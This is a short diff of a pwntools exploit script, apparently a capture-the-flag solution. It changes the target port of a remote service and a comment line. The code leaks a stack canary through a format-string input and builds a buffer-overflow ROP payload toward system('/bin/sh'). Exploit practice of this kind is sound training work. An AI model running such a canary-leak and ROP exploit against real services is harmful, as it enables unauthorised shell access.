@@ -11,7 +11,7 @@ ret_padding = 0x40122f
 system_plt = elf.plt['system']
 bin_sh_addr = next(elf.search(b'/bin/sh'))
 
-io = pwn.remote('10.21.232.223', 41750)
+io = pwn.remote('10.21.232.223', 57032)
 
 # 1. Request the canary leak via the format string vulnerability
 io.sendlineafter(b"What is your name?", b"%15$p")
@@ -21,7 +21,7 @@ io.recvuntil(b"Hello ")
 leaked_canary = int(io.recvline().strip(), 16)
 print(f"[+] Leaked Stack Canary: {hex(leaked_canary)}")
 
-# 2. Build the ROP chain payload for the gets() prompt
+# Build the ROP chain payload for the gets() prompt
 # Buffer size to canary is 40 bytes (0x30 - 0x8 = 40)
 payload = b"A" * 40
 payload += pwn.p64(leaked_canary)   # Put the correct canary back intact
